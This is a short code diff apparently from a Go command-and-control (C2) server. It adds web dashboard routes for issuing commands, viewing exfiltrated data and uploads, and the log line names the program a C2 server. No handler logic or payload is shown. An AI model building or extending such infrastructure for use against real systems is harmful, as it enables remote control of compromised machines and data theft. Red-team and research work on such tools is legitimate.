@@ -19,6 +19,11 @@ func main() {
 	http.HandleFunc("/download", handlers.DownloadHandler)
 	http.HandleFunc("/schedule", handlers.ScheduleHandler)
 
+	http.HandleFunc("/dashboard", handlers.DashboardHandler)
+	http.HandleFunc("/commandUI", handlers.CommandUIHandler)
+	http.HandleFunc("/exfilUI", handlers.ExfilUIHandler)
+	http.HandleFunc("/uploadUI", handlers.UploadUIHandler)
+
 	log.Println("[+] C2 Server running on :8080")
 	http.ListenAndServe(":8080", nil)
 }
